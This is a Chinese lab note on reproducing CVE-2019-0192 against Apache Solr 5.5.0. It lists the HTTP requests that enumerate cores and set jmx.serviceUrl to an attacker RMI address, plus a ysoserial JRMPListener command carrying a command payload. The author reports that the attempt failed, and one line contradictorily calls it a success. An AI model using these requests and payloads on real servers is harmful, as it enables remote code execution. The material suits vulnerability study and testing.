## CVE-2019-0192 

参考： [https://github.com/mpgn/CVE-2019-0192](https://github.com/mpgn/CVE-2019-0192)  

### 说明 
根据上述的指导进行验证时，在Windows上搭建Solr 5.5.0环境，JDK 7u25，通过在另一台机子上运行脚本CVE-2019-0192.py，运行失败；通过报文进行验证，同样失败，至此为验证成功。  

返回500响应，报错如下：  

	"errorMessages":["Unable to reload core [new_core]\nCould not start JMX monitoring \nCannot bind to URL [rmi://192.168.1.101:1099/obj]: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: Error unmarshaling return; nested exception is: \n\tjava.io.InvalidObjectException: Non-annotation type in annotation serial stream]\nnull\nError unmarshaling return; nested exception is: \n\tjava.io.InvalidObjectException: Non-annotation type in annotation serial stream\n"],
	"WARNING":"This response format is experimental.  It is likely to change in the future.",
  	"error":{
    "metadata":[
      "error-class","org.apache.solr.common.SolrException",
      "root-error-class","java.io.InvalidObjectException"],
    "msg":"Unable to reload core [new_core]",
    "trace":"org.apache.solr.common.SolrException: Unable to reload core [new_core]\n\tat org.apache.solr.core.CoreContainer.reload(CoreContainer.java:1151)\n\tat
    
漏洞说明，请参考网络上的其余链接。  
    
### 1. 通过接口获取core的列表
/solr/admin/cores?wt=json 接口：  
	
	GET /solr/admin/cores?wt=json HTTP/1.1
	Host: 192.168.1.103:8983
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
	Accept: */*
	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-	HK;q=0.5,en-US;q=0.3,en;q=0.2
	Accept-Encoding: gzip, deflate
	Referer: http://192.168.1.103:8983/solr/
	X-Requested-With: XMLHttpRequest
	Connection: close
	
	然后通过解析JSON，获取Core名称，如my_core和new_core  
	
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=UTF-8
	Connection: close

	{"responseHeader":{"status":0,"QTime":6},"initFailures":{},"status":{"my_core":{"name":"my_core","instanceDir":"F:\\WorkSpace\\solr-5.5.0\\server\\solr\\my_core","dataDir":"F:\\WorkSpace\\solr-5.5.0\\server\\solr\\my_core\\data\\","config":"solrconfig.xml","schema":"managed-schema","startTime":"2019-08-11T09:08:24.999Z","uptime":77885,"index":{"numDocs":0,"maxDoc":0,"deletedDocs":0,"indexHeapUsageBytes":0,"version":2,"segmentCount":0,"current":true,"hasDeletions":false,"directory":"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(MMapDirectory@F:\\WorkSpace\\solr-5.5.0\\server\\solr\\my_core\\data\\index lockFactory=org.apache.lucene.store.NativeFSLockFactory@21f6174a; maxCacheMB=48.0 maxMergeSizeMB=4.0)","segmentsFile":"segments_1","segmentsFileSizeInBytes":71,"userData":{},"sizeInBytes":71,"size":"71 bytes"}},"new_core":{"name":"new_core","instanceDir":"F:\\WorkSpace\\solr-5.5.0\\server\\solr\\new_core","dataDir":"F:\\WorkSpace\\solr-5.5.0\\server\\solr\\new_core\\data\\","config":"solrconfig.xml","schema":"managed-schema","startTime":"2019-08-11T09:07:42.503Z","uptime":120382,"index":{"numDocs":0,"maxDoc":0,"deletedDocs":0,"indexHeapUsageBytes":0,"version":2,"segmentCount":0,"current":true,"hasDeletions":false,"directory":"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(MMapDirectory@F:\\WorkSpace\\solr-5.5.0\\server\\solr\\new_core\\data\\index lockFactory=org.apache.lucene.store.NativeFSLockFactory@21f6174a; maxCacheMB=48.0 maxMergeSizeMB=4.0)","segmentsFile":"segments_1","segmentsFileSizeInBytes":71,"userData":{},"sizeInBytes":71,"size":"71 bytes"}}}}
  
	
### 2. 通过远程配置jmx.serviceUrl，配置恶意的RMI
/solr/new_core/config 接口：  

	POST /solr/new_core/config HTTP/1.1
	Host: 192.168.1.103:8983
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
	Content-Type:application/json
	Connection: close
	Content-Length: 92

	{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://192.168.1.101:1099/obj"}}
	
### 3. 执行步骤2之前，先开启RMI服务  

	java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 "touch /tmp/pwn.txt"

py文件中，请求修改响应地址，RMI地址以及Solr服务器地址。  
